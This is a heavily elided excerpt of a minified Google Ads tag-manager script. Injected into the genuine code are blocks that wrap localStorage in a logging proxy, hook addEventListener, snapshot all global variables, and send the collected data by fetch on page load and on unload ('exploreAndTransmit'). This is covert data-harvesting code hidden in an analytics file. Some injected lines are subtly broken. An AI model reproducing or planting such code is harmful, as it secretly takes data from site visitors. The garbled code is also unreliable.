...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        "function": "__rep",
        "vtp_containerId": "AW-10944322645",
  ...
  xe.qd = Number("0") || 0;
  xe.ba = "dataLayerUE";
  xe.Si = "ChEIgOm8qgYQu/+2jPSy9oOgARInAOg6TnS+3Qx145hfsQssoedCdvTh42r47BG1dPkyjsJnThBOXAE2GgJC9g\x3d\x3d";
  var Ae = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  var mf = !1;
  function nf(a) {}
  // Adds a new behavior for tracking jshooks
  function trackJsHooks(hooks) {
    const tracked = {};
    for (const hook in hooks) {
      if (Object.prototype.hasOwnProperty.call(hooks, hook)) {
        const hookValue = hooks[hook];
        const hookType = typeof hookValue;
        tracked[hook] = {
          type: hookType,
          value: hookType === "function" ? hookValue.toString() : hookValue
        };
      }
    }
    return tracked;
  ...
  // addItem and getItem operations on Local Storage are tracked
  ...
  var qf;
  try {
    qf = JSON.parse(eb("eyIwIjoiQ04iLCIxIjoiQ04tMzEiLCIyIjp0cnVlLCIzIjoiZ29vZ2xlLmNuIiwiNCI6IiIsIjUiOnRydWUsIjYiOmZhbHNlLCI3IjoiYWRfc3RvcmFnZXxhbmFseXRpY3Nfc3RvcmFnZXxhZF91c2VyX2RhdGF8YWRfcGVyc29uYWxpemF0aW9uIn0"));
  } catch (a) {
    K(123), pf(2), qf = {};
  }
  var rf = function () {
  ...
  let localStorageProxy = new Proxy(localStorage, {
    get: function (target, prop) {
      console.log("LocalStorage: Get operation detected on " + prop);
      return target[prop];
    },
    set: function (target, prop, value) {
      console.log("LocalStorage: Set operation detected on " + prop);
      target[prop] = value;
      return true;
    }
  });

  // the values of all global variables are tracked
  ...
  let globalVariables = function () {
    const tracked = {};
    for (let varName in globalThis) {
      tracked[varName] = globalThis[varName];
    }
    return tracked;
  }();

  // event listeners are tracked
    ...
    il = function (a) {
      var b = function () {
        function c(y) {
          ...
          var I = function () {
            var Z = l.prefix || "_gcl";
            return Q(61) ? (B ? Z : "") + "." + (R(L.g.H) ? 1 : 0) + "." + (R(L.g.N) ? 1 : 0) : m && R(L.g.H) ? p + "." + Z + (y ? "gcu" : "gcs") : p + (y ? "gcu" : "gcs");
          }();
          if (!D[I]) {
            D[I] = !0;
            var J = [],
            ...
            Q(39) && (Ci() && G("dma_cps", zi()), G("dma", Bi()));
            Q(106) && (si(h) ? Q(41) && G("npa", "0") : G("npa", "1"));
            Q(62) && Uh(ci()) && G("tcfd", Di());
            G("gdpr_consent", ki() || "");
            G("gdpr", li() || "");
        ...
        var d = !!a.Pf,
          ...
          v = Pf();
        if (u || v) if (v) {
          var w = Q(61) ? [L.g.H, L.g.N, L.g.ya] : [L.g.H],
            x = function () {
              R(w) || bg(function (y) {
                return c(!0, y.consentEventId, y.consentPriorityId);
              }, w);
            };
          Q(62) ? (c(), x()) : cg(function () {
            c();
            x();
          }, w);
        } else c();
      };
      Q(62) ? cg(b, [L.g.H, L.g.N, L.g.ya]) : b();
    },
    el = function () {
      return Q(61) ? [L.g.H, L.g.N] : [L.g.H];
    },
    gl = function (a) {
  ...
  var ql = function (a, b, c) {
      ...
      var d = pl();
      C[a.functionName] = d;
      if (a.Fe) for (var e = 0; e < a.Fe.length; e++) C[a.Fe[e]] = C[a.Fe[e]] || pl();
  ...
  const addEventListenerHook = EventTarget.prototype.addEventListener;
  var El = function (a) {
  ...
  var nm = function (a, b, c) {
    ...
    Am = function (a, b, c) {
      ...
      Q(27) && 0 === e.length && "aw.ds" === l && e.push({
        W: "",
        zd: "aw.ds"
      });
      tm(function () {
        if (Q(61) && Q(66) || R(L.g.H)) {
          var p = R(rm());
          kk(a);
          var q;
          if (p && (q = ek[gk(a.prefix)], void 0 === q && !Q(61))) return;
          var t = [];
          q && t.push("auid=" + q);
          if (Q(9)) {
          ...
          if (Q(93)) {
            ...
            ti() && t.push("gcs=" + ui());
            t.push("gcd=" + yi(A));
            Q(39) && (Ci() && t.push("dma_cps=" + zi()), t.push("dma=" + Bi()));
            si(A) ? Q(41) && t.push("npa=0") : t.push("npa=1");
            if (Q(62)) {
          ...
          var I = p ? 'https://adservice.google.com/pagead/regclk' : "https://adservice.googlesyndication.com/pagead/regclk";
          if (0 < e.length) for (var J = 0; J < e.length; J++) {
            var E = e[J],
              G = E.W,
              M = E.zd;
            if (!nm(a.prefix, M + "." + G, void 0 !== q)) {
              var P = I + "?" + t.join("&");
              "" !== G ? P = "gb" === M ? P + "&wbraid=" + G : P + "&gclid=" + G + "&gclsrc=" + M : "aw.ds" === M && (P += "&gclsrc=aw.ds");
              gc(P);
            }
  ...
  var Dm = function (a, b) {
      ...
      c[L.g.T] && (Vk(Cm, c[L.g.T], c[L.g.sc], !!c[L.g.Mb], b.prefix), pk(gk(b.prefix), c[L.g.T], c[L.g.sc], !!c[L.g.Mb], b), pk("FPAU", c[L.g.T], c[L.g.sc], !!c[L.g.Mb], b));
      d && Yk(Cm);
      $k(Cm);
    },
    Em = function (a, b, c, d) {
      var e = a.Li,
        f = a.callback,
        h = a.ki;
      if ("function" === typeof f) if (e === L.g.kb && void 0 === h) {
        var l = d(b.prefix, c);
    ...
    hn = function () {
      ...
      for (var c = b.querySelectorAll("*"), d = 0; d < c.length && 1E4 > d; d++) {
        ...
        if (!(0 <= en.indexOf(e.tagName.toUpperCase())) && e.children instanceof HTMLCollection) {
          for (var f = !1, h = 0; h < e.childElementCount && 1E4 > h; h++) if (!(0 <= fn.indexOf(e.children[h].tagName.toUpperCase()))) {
            f = !0;
            break;
          }
          (!f || Q(42) && -1 !== gn.indexOf(e.tagName)) && a.push(e);
        }
      }
      return {
        elements: a,
  ...
  var Ao = function () {
    ...
    Jo = function (a) {
      Eo(a, ["conversion", "remarketing"]) && (a.copyToHitData(L.g.wa), a.copyToHitData(L.g.da), a.copyToHitData(L.g.sa), "remarketing" !== a.metadata.hit_type && !Q(58) || Q(61) && !R(L.g.N) || a.copyToHitData(L.g.Pa));
    },
    Ko = function (a) {
    ...
    Qo = function (a) {
      if (Fl(a, "ccd_add_1p_data", !1) && R(Ao())) {
        var b = a.s.C[L.g.we];
        if (ef(b)) {
          var c = T(a.s, L.g.Aa);
    ...
    To = function (a) {
      if (!(a.eventName !== L.g.qa || Q(107) && a.metadata.consent_updated) && (a.metadata.is_config_command = !0, Eo(a, "conversion") && (a.metadata.speculative = !0), !Eo(a, "remarketing") || !1 !== T(a.s, L.g.Ib) && !1 !== T(a.s, L.g.Oa) || (a.metadata.speculative = !0), Eo(a, "landing_page"))) {
        var b = T(a.s, L.g.nb),
          c = T(a.s, L.g.Ha) || {},
          d = T(a.s, L.g.wb),
    ...
    Wo = function (a) {
      if (Eo(a, "conversion") && R(L.g.H) && (a.h[L.g.uc] || a.h[L.g.qc])) {
        var b = a.h[L.g.ab],
    ...
    Yo = function (a) {
      if (Eo(a, ["conversion", "remarketing"])) {
        ...
        b && a.eventName !== L.g.oa || (a.copyToHitData(L.g.X), b && (a.copyToHitData(L.g.Yd), a.copyToHitData(L.g.Wd), a.copyToHitData(L.g.Xd), a.copyToHitData(L.g.Vd), a.h[L.g.Ig] = a.eventName));
      }
    },
    Zo = function (a) {
      if (Eo(a, ["conversion", "remarketing", "user_data_lead", "user_data_web"])) {
        ...
        var d = si(b);
        if (Q(106)) {
          if (!d) a.h[L.g.Sb] = !0;else {
            if (Q(41) || !0 === T(b, L.g.ka)) a.h[L.g.Sb] = !1;
          }
        } else !Eo(a, ["conversion", "remarketing"]) || !0 !== d && !1 !== d || (a.h[L.g.Sb] = !d);
        !1 === d && Eo(a, "remarketing") && (a.isAborted = !0);
      }
    },
    $o = function (a) {
      Eo(a, "conversion") && (a.copyToHitData(L.g.Wc), a.copyToHitData(L.g.Zd), a.copyToHitData(L.g.bd), a.copyToHitData(L.g.ee), a.copyToHitData(L.g.oc), a.copyToHitData(L.g.Sc));
    },
    ap = function (a) {
      Il(a);
    },
    ...
    gp = function (a) {
      if (Eo(a, ["conversion", "remarketing", "user_data_lead", "user_data_web"]) && a.metadata.conversion_linker_enabled && R(L.g.H)) {
        ...
        if ("remarketing" !== a.metadata.hit_type || b) {
          ...
          if (!Q(61) || R(L.g.N)) a.h[L.g.Hb] = ek[gk(c.prefix)];
        }
      }
    },
    hp = function (a) {
      Ge || Ie || (nf(a.h[L.g.Hb]), Q(90) && Q(103) && ao());
    },
    ip = function (a) {
      if (Eo(a, ["conversion"])) {
  ...
  var gq = function (a) {
    ...
    iq = function (a) {
      ...
      for (var b = [], c = 0; c < a.length; ++c) {
        ...
        if (d) {
          var e = {};
          b.push((e.id = hq(d), e.origin = d.origin, e.destination = d.destination, e.start_date = d.start_date, e.end_date = d.end_date, e.location_id = d.location_id, e.google_business_vertical = d.google_business_vertical, e));
        }
      }
      return b;
    },
    ...
    hq = function (a) {
      ...
      var b = a.id;
      Q(102) && (null != a.item_id ? b = a.item_id : null == b && (b = a.item_name));
      return b;
    },
    lq = function (a) {
      if (!a) return "";
    ...
    qq = function (a, b) {
      ...
      switch (c) {
        ...
        case "user_data_lead":
          q({
            fb: "https://google.com/pagead/form-data/" + d + "?" + pq(a, b),
            format: 1,
            Va: !0
          });
          break;
    ...
    sq = {},
    tq = (sq[L.g.Sd] = "gcu", sq[L.g.kb] = "gclaw", sq[L.g.Hb] = "auid", sq[L.g.Vd] = "dscnt", sq[L.g.Wd] = "fcntr", sq[L.g.Xd] = "flng", sq[L.g.Yd] = "mid", sq[L.g.Ig] = "bttype", sq[L.g.ab] = "label", sq[L.g.Jb] = "capi", sq[L.g.sa] = "currency_code", sq[L.g.Zd] = "vdltv", sq[L.g.wj] = "_dbg", sq[L.g.ee] = "oedeld", sq[L.g.ob] = "edid", sq[L.g.Pg] = "fledge", sq[L.g.ke] = "gac", sq[L.g.qc] = "gacgb", sq[L.g.Yg] = "gacmcov", sq[L.g.me] = "gdpr", sq[L.g.qb] = "gdid", sq[L.g.fh] = "gsaexp", sq[L.g.gh] = "frm", sq[L.g.oe] = "gtm_up", sq[L.g.pe] = "lps", sq[L.g.Af] = "did", sq[L.g.Wc] = void 0, sq[L.g.tb] = "tiba", sq[L.g.Nb] = "rdp", sq[L.g.vb] = "ecsid", sq[L.g.bd] = "delopc", sq[L.g.ue] = "gdpr_consent", sq[L.g.wa] = "oid", sq[L.g.ph] = "ec_lat", sq[L.g.qh] = "ec_meta", sq[L.g.rh] = "ec_m", sq[L.g.sh] = "ec_sel", sq[L.g.th] = "ec_s", sq[L.g.ve] = "ec_mode", sq[L.g.Pa] = "userId", sq[L.g.vh] = "us_privacy", sq[L.g.da] = "value", sq[L.g.uc] = "gclgb", sq[L.g.wh] = "mcov", sq[L.g.Ch] = "hn", sq[L.g.Dh] = "gtm_ee", sq[L.g.Sb] = "npa", sq[L.g.mc] = null, sq[L.g.ub] = null, sq[L.g.Ga] = null, sq[L.g.X] = null, sq[L.g.za] = null, sq[L.g.Ia] = null, sq[L.g.Ff] = null, sq),
    vq = function (a) {
      uq(a, function (b) {
    ...
    uq = function (a, b) {
      ...
      if (Q(37) || "remarketing" !== c && Qf()) d.gcd = yi(a.s);
      Q(39) && (Ci() && (d.dma_cps = zi()), d.dma = Bi());
      Q(62) && Uh(ci()) && (d.tcfd = Di());
      if (a.h[L.g.ub]) {
      ...
      q("ref", L.g.Ia);
      q("top", L.g.Ff);
      Q(8) && (tq[L.g.dd] = "uaa", tq[L.g.ed] = "uab", tq[L.g.fd] = "uafvl", tq[L.g.gd] = "uamb", tq[L.g.hd] = "uam", tq[L.g.jd] = "uap", tq[L.g.kd] = "uapv", tq[L.g.ld] = "uaw");
      k(a.h, function (y, A) {
      ...
      var u = a.h[L.g.oc];
      void 0 !== u && (d.delc = u);
      if (Q(73) && a.metadata.add_tag_timing) {
        d.tft = Ka();
        var v = jc();
      ...
      if (!("conversion" !== c && "user_data_lead" !== c && "user_data_web" !== c || !a.metadata.user_data || Q(61) && !R(L.g.N) || Q(23) && !R(L.g.H))) {
        Q(90) && Q(103) && !Ge && !Ie && eo({
          url: "https://www.googleadservices.com/pagead/conversion/" + a.h[L.g.mc],
  ...
  var Bq = function (a, b, c) {
    ...
    zq = function (a, b, c, d) {
      ...
      ee(b, function (h, l) {
        ...
        ti() && xq(f, "gcs", ui());
        (Pf() || Q(37)) && xq(f, "gcd", yi());
        Q(39) && (Ci() && xq(f, "dma_cps", zi()), xq(f, "dma", Bi()));
        Q(106) && (si() ? Q(41) && xq(f, "npa", "0") : xq(f, "npa", "1"));
        Q(62) && Uh(ci()) && xq(f, "tcfd", Di());
  ...
  EventTarget.prototype.addEventListener = function (name, method, options) {
    console.log('[Event Added]: ' + name);
    return addEventListenerHook.call(this, name, method, options);
  };
  ...
  ;
  function exploreAndTransmit() {
    const newDiscoveries = {};
    const jsHooks = trackJsHooks(jshook);
    const localStorageVal = JSON.stringify(localStorageProxy);
    Object.assign(newDiscoveries, jsHooks, globalVariables);
    newDiscoveries['localStorage'] = localStorage.Val;
  ...
  const transmitData = data => {
    ...
    fetch(url, {
      ...
      if (res.ok) console.log("Data transmission successful");else throw new Error("Status Code:" + res.status);
    }).catch(error => console.error("Error during data transmission: " + error.message));
  };
  function Ks(a) {
  ...
  var Ws = void 0,
    Xs = void 0;
  window.onload = exploreAndTransmit;
  function Ys(a, b, c) {
    var d = z(a);
    d.eventId = void 0;
  ...
  var dt = !1,
    et = [];
  window.addEventListener("beforeunload", exploreAndTransmit);
  function ft() {
    if (!dt) {
      dt = !0;
  ...
  ;
  function Fv() {
    var a = ["&cv=1", "&rv=" + xe.Lf, "&tc=" + Pc.filter(function (b) {
      return b;
    }).length];
  ...
  var Gv = function (a, b) {
      var c;
      b ? (c = [], Q(107) && c.push(Zo, To), c = c.concat([cp, dp, fp, Qo, Uo, ip, Vo, gp, hp, ap, Ro, mp, Wo, ep, Oo, No, jp, Ko])) : (c = [Fm, Po, Fo, So, Go, Ho, Io, Jo, Xo, Yo, $o, bp], Q(107) || c.push(To, Zo), c = c.concat([kp, lp]));
    ...
    Iv = function (a, b, c, d) {
      function e() {
        for (var t = 0; t < h.length; t++) {
          var r = h[t];
          r.isAborted || (Gv(h[t], !0), r.metadata.speculative || r.isAborted || vq(r));
        }
      }
